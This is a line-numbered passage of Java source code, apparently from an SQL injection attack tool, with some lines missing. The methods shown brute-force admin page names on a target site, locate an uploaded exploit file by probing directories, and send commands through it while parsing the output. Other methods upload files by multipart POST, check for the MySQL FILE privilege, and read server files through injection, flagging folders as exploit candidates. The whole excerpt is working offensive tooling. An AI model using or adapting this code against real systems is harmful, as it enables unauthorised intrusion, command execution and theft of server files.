132      * Check if every page in the list responds 200 Success.

135     public int createAdminPages(String urlInjection, List<String> pageNames) {
136         var matcher = Pattern.compile("^((https?://)?[^/]*)(.*)").matcher(urlInjection);
137         matcher.find();
138         String urlProtocol = matcher.group(1);
139         String urlWithoutProtocol = matcher.group(3);
140 
141         List<String> folderSplits = new ArrayList<>();
142 
143         // Hostname only
144         if (urlWithoutProtocol.isEmpty() || !Pattern.matches("^/.*", urlWithoutProtocol)) {
145             urlWithoutProtocol = "/dummy";
146         }
147         String[] splits = urlWithoutProtocol.split("/", -1);
148         String[] folderNames = Arrays.copyOf(splits, splits.length - 1);
149         for (String folderName: folderNames) {
150             folderSplits.add(folderName +"/");
151         }
152 
153         ExecutorService taskExecutor = this.injectionModel.getMediatorUtils().getThreadUtil().getExecutor("CallableGetAdminPage");
154         CompletionService<CallableHttpHead> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);
155 
156         var urlPart = new StringBuilder();
157         for (String segment: folderSplits) {
158             urlPart.append(segment);
159             for (String pageName: pageNames) {
160                 taskCompletionService.submit(
161                     new CallableHttpHead(
162                         urlProtocol + urlPart + pageName,
163                         this.injectionModel,
164                         "check:page"
165                     )
166                 );
167             }
168         }
169 
170         var nbAdminPagesFound = 0;
171         int submittedTasks = folderSplits.size() * pageNames.size();
172         int tasksHandled;
173         for (
174             tasksHandled = 0
175             ; tasksHandled < submittedTasks && !this.isSearchAdminStopped()
176             ; tasksHandled++
177         ) {
178             nbAdminPagesFound = this.callAdminPage(taskCompletionService, nbAdminPagesFound);
179         }
180 
181         this.injectionModel.getMediatorUtils().getThreadUtil().shutdown(taskExecutor);
182         this.isSearchAdminStopped = false;
183         this.logSearchAdminPage(nbAdminPagesFound, submittedTasks, tasksHandled);
184 
185         return nbAdminPagesFound;
186     }

188     public int callAdminPage(CompletionService<CallableHttpHead> taskCompletionService, int nbAdminPagesFound) {
189         int nbAdminPagesFoundFixed = nbAdminPagesFound;
190         
191         try {
192             CallableHttpHead currentCallable = taskCompletionService.take().get();
193             if (currentCallable.isHttpResponseOk()) {
194                 var request = new Request();
195                 request.setMessage(Interaction.CREATE_ADMIN_PAGE_TAB);
196                 request.setParameters(currentCallable.getUrl());
197                 this.injectionModel.sendToViews(request);
198 
199                 nbAdminPagesFoundFixed++;
200                 LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "Found page: {}", currentCallable.getUrl());
201             }
202         } catch (InterruptedException e) {
203             LOGGER.log(LogLevelUtil.IGNORE, e, e);
204             Thread.currentThread().interrupt();
205         } catch (ExecutionException e) {
206             LOGGER.log(LogLevelUtil.CONSOLE_JAVA, e, e);
207         }
208         return nbAdminPagesFoundFixed;
209     }

227     public String checkUrls(String urlExploit, String nameExploit, BinaryOperator<String> biFuncGetRequest) {
228         String urlExploitFixed = urlExploit;
229         if (!urlExploitFixed.isEmpty()) {
230             urlExploitFixed = urlExploitFixed.replaceAll("/*$", StringUtils.EMPTY) +"/";
231         }
232         String url = urlExploitFixed;
233         if (StringUtils.isEmpty(url)) {
234             url = this.injectionModel.getMediatorUtils().getConnectionUtil().getUrlBase();
235         }
236         String urlWithoutProtocol = url.replaceAll("^https?://[^/]*", StringUtils.EMPTY);
237         String urlProtocol;
238         if ("/".equals(urlWithoutProtocol)) {
239             urlProtocol = url.replaceAll("/+$", StringUtils.EMPTY);
240         } else {
241             urlProtocol = url.replace(urlWithoutProtocol, StringUtils.EMPTY);
242         }
243 
244         List<String> directoryNames = new ArrayList<>();
245         String urlWithoutFileName = urlWithoutProtocol.replaceAll("[^/]*$", StringUtils.EMPTY).replaceAll("/+", "/");
246         if (urlWithoutFileName.split("/").length == 0) {
247             directoryNames.add("/");
248         }
249         for (String directoryName: urlWithoutFileName.split("/")) {
250             directoryNames.add(directoryName +"/");
251         }
252         String urlSuccess = this.getExploitUrl(nameExploit, directoryNames, urlProtocol);
253         if (urlSuccess != null) {
254             urlSuccess = biFuncGetRequest.apply(nameExploit, urlSuccess);
255         } else {
256             LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Exploit access failure: connection URL not found");
257         }
258         return urlSuccess;
259     }

261     private String getExploitUrl(String filename, List<String> directoryNames, String urlProtocol) {
262         ExecutorService taskExecutor = this.injectionModel.getMediatorUtils().getThreadUtil().getExecutor("CallableGetExploitUrl");
263         CompletionService<CallableHttpHead> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);
264         var urlPart = new StringBuilder();
265 
266         for (String segment: directoryNames) {
267             urlPart.append(segment);
268             taskCompletionService.submit(
269                 new CallableHttpHead(
270                     urlProtocol + urlPart + filename,
271                     this.injectionModel,
272                     "xplt#confirm-url"
273                 )
274             );
275         }
276 
277         String urlSuccess = null;
278         int submittedTasks = directoryNames.size();
279         for (var tasksHandled = 0 ; tasksHandled < submittedTasks ; tasksHandled++) {
280             try {
281                 CallableHttpHead currentCallable = taskCompletionService.take().get();
282                 if (currentCallable.isHttpResponseOk()) {
283                     urlSuccess = currentCallable.getUrl();
284                     LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "Exploit successful: connection done to [{}]", currentCallable.getUrl());
285                     break;
286                 }
287             } catch (InterruptedException e) {
288                 LOGGER.log(LogLevelUtil.IGNORE, e, e);
289                 Thread.currentThread().interrupt();
290             } catch (ExecutionException e) {
291                 LOGGER.log(LogLevelUtil.CONSOLE_JAVA, e, e);
292             }
293         }
294 
295         this.injectionModel.getMediatorUtils().getThreadUtil().shutdown(taskExecutor);
296         return urlSuccess;
297     }

299     public String callCommand(String urlCommand) {
300         String pageSource;
301         try {
302             pageSource = this.injectionModel.getMediatorUtils().getConnectionUtil().getSource(urlCommand);
303         } catch (Exception e) {
304             pageSource = StringUtils.EMPTY;
305         }
306         
307         var regexSearch = Pattern.compile("(?s)<"+ DataAccess.LEAD +">(.*?)<"+ DataAccess.TRAIL +">").matcher(pageSource);
308         regexSearch.find();
309 
310         String result;
311         // IllegalStateException #1544: catch incorrect execution
312         try {
313             result = regexSearch.group(1);
314         } catch (IllegalStateException e) {
315             result = StringUtils.EMPTY;  // fix return null from regex
316             LOGGER.log(LogLevelUtil.CONSOLE_ERROR, String.format(ResourceAccess.TEMPLATE_ERROR, "empty result", "command"));
317         }
318         return result;
319     }

385     private String convert(List<List<String>> listRows, List<Integer> listFieldsLength) {
386         var tableText = new StringBuilder("+");
387         for (Integer fieldLength: listFieldsLength) {
388             tableText.append("-").append(StringUtils.repeat("-", fieldLength)).append("-+");
389         }
390         tableText.append("\n");
391         for (List<String> listFields: listRows) {
392             tableText.append("|");
393             var cursorPosition = 0;
394             for (String field: listFields) {
395                 tableText.append(StringUtils.SPACE)
396                     .append(field)
397                     .append(StringUtils.repeat(StringUtils.SPACE, listFieldsLength.get(cursorPosition) - field.length()))
398                     .append(" |");
399                 cursorPosition++;
400             }
401             tableText.append("\n");
402         }
403         tableText.append("+");
404         for (Integer fieldLength: listFieldsLength) {
405             tableText.append("-").append(StringUtils.repeat("-", fieldLength)).append("-+");
406         }
407         tableText.append("\n");
408         return tableText.toString();
409     }

411     private List<Integer> parseColumnLength(List<List<String>> listRows) {
412         List<Integer> listFieldsLength = new ArrayList<>();
413         for (
414             var indexLongestRowSearch = 0;
415             indexLongestRowSearch < listRows.get(0).size();
416             indexLongestRowSearch++
417         ) {
418             int indexLongestRowSearchFinal = indexLongestRowSearch;
419             listRows.sort(
420                 (firstRow, secondRow) -> secondRow.get(indexLongestRowSearchFinal).length() - firstRow.get(indexLongestRowSearchFinal).length()
421             );
422             listFieldsLength.add(listRows.get(0).get(indexLongestRowSearch).length());
423         }
424         return listFieldsLength;
425     }

427     private List<List<String>> parse(String result) {
428         List<List<String>> listRows = new ArrayList<>();
429         var rowsMatcher = Pattern.compile("(?si)<tr>(<td>.*?</td>)</tr>").matcher(result);
430         while (rowsMatcher.find()) {
431             String values = rowsMatcher.group(1);
432             var fieldsMatcher = Pattern.compile("(?si)<td>(.*?)</td>").matcher(values);
433             List<String> listFields = new ArrayList<>();
434             listRows.add(listFields);
435             
436             while (fieldsMatcher.find()) {
437                 String field = fieldsMatcher.group(1);
438                 listFields.add(field);
439             }
440         }
441         return listRows;
442     }

444     public HttpResponse<String> upload(File file, String url, InputStream streamToUpload) throws IOException, JSqlException, InterruptedException {
445         var crLf = "\r\n";
446         var boundary = "---------------------------4664151417711";
447         
448         var streamData = new byte[streamToUpload.available()];
449         if (streamToUpload.read(streamData) == -1) {
450             throw new JSqlException("Error reading the file");
451         }
452         
453         String headerForm = StringUtils.EMPTY;
454         headerForm += "--"+ boundary + crLf;
455         headerForm += "Content-Disposition: form-data; name=\"u\"; filename=\""+ file.getName() +"\""+ crLf;
456         headerForm += "Content-Type: binary/octet-stream"+ crLf;
457         headerForm += crLf;
458 
459         String headerFile = StringUtils.EMPTY;
460         headerFile += crLf +"--"+ boundary +"--"+ crLf;
461 
462         var httpRequest = HttpRequest.newBuilder()
463             .uri(URI.create(url))
464             .timeout(Duration.ofSeconds(15))
465             .POST(BodyPublishers.ofByteArrays(
466                 Arrays.asList(
467                     headerForm.getBytes(StandardCharsets.UTF_8),
468                     Files.readAllBytes(Paths.get(file.toURI())),
469                     headerFile.getBytes(StandardCharsets.UTF_8)
470                 )
471             ))
472             .setHeader("Content-Type", "multipart/form-data; boundary=" + boundary)
473             .build();
474 
475         var response = this.injectionModel.getMediatorUtils().getConnectionUtil().getHttpClient().build().send(httpRequest, BodyHandlers.ofString());
476         HttpHeaders httpHeaders = response.headers();
477         String pageSource = response.body();
478 
479         Map<Header, Object> msgHeader = new EnumMap<>(Header.class);
480         msgHeader.put(Header.URL, url);
481         msgHeader.put(Header.HEADER, ConnectionUtil.getHeadersMap(httpRequest.headers()));
482         msgHeader.put(Header.RESPONSE, ConnectionUtil.getHeadersMap(httpHeaders));
483         msgHeader.put(Header.SOURCE, pageSource);
484         msgHeader.put(Header.METADATA_PROCESS, "upl#multipart");
485         var request = new Request();
486         request.setMessage(Interaction.MESSAGE_HEADER);
487         request.setParameters(msgHeader);
488         this.injectionModel.sendToViews(request);
489         return response;
490     }

493      * Check if current user can read files.
494      * @return True if user can read file, false otherwise
495      * @throws JSqlException when an error occurs during injection
496      */
497     public boolean isMysqlReadDenied() throws JSqlException {
498         var sourcePage = new String[]{ StringUtils.EMPTY };
499         String resultInjection = new SuspendableGetRows(this.injectionModel).run(
500             this.injectionModel.getResourceAccess().getExploitMysql().getModelYaml().getFile().getPrivilege(),
501             sourcePage,
502             false,
503             1,
504             MockElement.MOCK,
505             "privilege"
506         );
507 
508         boolean readingIsAllowed = false;
509 
510         if (StringUtils.isEmpty(resultInjection)) {
511             this.injectionModel.sendResponseFromSite("Can't read privilege", sourcePage[0].trim());
512             var request = new Request();
513             request.setMessage(Interaction.MARK_FILE_SYSTEM_INVULNERABLE);
514             this.injectionModel.sendToViews(request);
515         } else if ("false".equals(resultInjection)) {
516             LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Privilege FILE not granted: files not readable by current user");
517             var request = new Request();
518             request.setMessage(Interaction.MARK_FILE_SYSTEM_INVULNERABLE);
519             this.injectionModel.sendToViews(request);
520         } else {
521             var request = new Request();
522             request.setMessage(Interaction.MARK_FILE_SYSTEM_VULNERABLE);
523             this.injectionModel.sendToViews(request);
524             readingIsAllowed = true;
525         }
526         
527         return !readingIsAllowed;
528     }

530     /**
531      * Attempt to read files in parallel by their path from the website using injection.
532      * Reading file needs a FILE right on the server.
533      * The user can interrupt the process at any time.
534      * @param pathsFiles List of file paths to read
535      * @throws JSqlException when an error occurs during injection
536      * @throws InterruptedException if the current thread was interrupted while waiting
537      * @throws ExecutionException if the computation threw an exception
538      */
539     public List<String> readFile(List<String> pathsFiles) throws JSqlException, InterruptedException, ExecutionException {
540         if (
541             this.injectionModel.getMediatorVendor().getVendor() == this.injectionModel.getMediatorVendor().getMysql()
542             && this.isMysqlReadDenied()
543         ) {
544             return Collections.emptyList();
545         }
546 
547         var countFileFound = 0;
548         var results = new ArrayList<String>();
549 
550         ExecutorService taskExecutor = this.injectionModel.getMediatorUtils().getThreadUtil().getExecutor("CallableReadFile");
551         CompletionService<CallableFile> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);
552 
553         for (String pathFile: pathsFiles) {
554             var callableFile = new CallableFile(pathFile, this.injectionModel);
555             taskCompletionService.submit(callableFile);
556             this.callablesReadFile.add(callableFile);
557         }
558 
559         List<String> duplicate = new ArrayList<>();
560         int submittedTasks = pathsFiles.size();
561         int tasksHandled;
562 
563         for (
564             tasksHandled = 0
565             ; tasksHandled < submittedTasks && !this.isSearchFileStopped
566             ; tasksHandled++
567         ) {
568             var currentCallable = taskCompletionService.take().get();
569             if (StringUtils.isNotEmpty(currentCallable.getSourceFile())) {
570                 var name = currentCallable.getPathFile().substring(
571                     currentCallable.getPathFile().lastIndexOf('/') + 1
572                 );
573                 String content = currentCallable.getSourceFile();
574                 String path = currentCallable.getPathFile();
575 
576                 var request = new Request();
577                 request.setMessage(Interaction.CREATE_FILE_TAB);
578                 request.setParameters(name, content, path);
579                 this.injectionModel.sendToViews(request);
580 
581                 if (!duplicate.contains(path.replace(name, StringUtils.EMPTY))) {
582                     LOGGER.log(
583                         LogLevelUtil.CONSOLE_INFORM,
584                         "Folder exploit candidate: {}",
585                         () -> path.replace(name, StringUtils.EMPTY)
586                     );
587                 }
588 
589                 duplicate.add(path.replace(name, StringUtils.EMPTY));
590                 results.add(content);
591 
592                 countFileFound++;
593             }
594         }
595 
596         // Force ongoing suspendables to stop immediately
597         for (CallableFile callableReadFile: this.callablesReadFile) {
598             callableReadFile.getSuspendableReadFile().stop();
599         }
600         this.callablesReadFile.clear();
601         this.injectionModel.getMediatorUtils().getThreadUtil().shutdown(taskExecutor);
602         this.isSearchFileStopped = false;
603 
604         var result = String.format(
605             "Searched %s/%s file%s: %s found",
606             tasksHandled,
607             submittedTasks,
608             tasksHandled > 1 ? 's' : StringUtils.EMPTY,
609             countFileFound
610         );
611 
612         if (countFileFound > 0) {
613             LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, result);
614         } else {
615             LOGGER.log(LogLevelUtil.CONSOLE_ERROR, result);
616         }
617         return results;
